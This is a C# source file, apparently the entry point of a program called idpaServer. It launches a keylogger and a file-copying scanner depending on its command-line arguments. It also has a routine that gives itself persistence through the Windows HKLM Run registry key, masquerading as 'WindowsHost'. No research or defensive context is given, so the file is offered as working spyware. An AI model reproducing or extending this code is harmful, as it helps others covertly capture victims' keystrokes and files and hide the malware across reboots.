using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using Microsoft.Win32;

namespace idpaServer
{

    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length <= 0)
                startKeylogger();

            foreach(string argumen in args)
            {
                switch (argumen)
                {
                    case "keylogger":
                    {
                        startKeylogger();
                    }
                    break;
                    case "fileScanner":
                    {
                        FileScanner.startCopy();
                    }
                    break;
                    case "all":
                    {
                        startKeylogger();
                        FileScanner.startCopy();
                    }
                    break;
                    default:
                    {
                        startKeylogger();
                    }
                    break;
                }
            }
        }

        static void startKeylogger()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Keylogger());
        }

        static void setAutoStart()
        {
            RegistryKey regKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            //RegistryKey regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            regKey.SetValue("WindowsHost", "\"" + Application.ExecutablePath.ToString() + "\"");
        }
    }
}
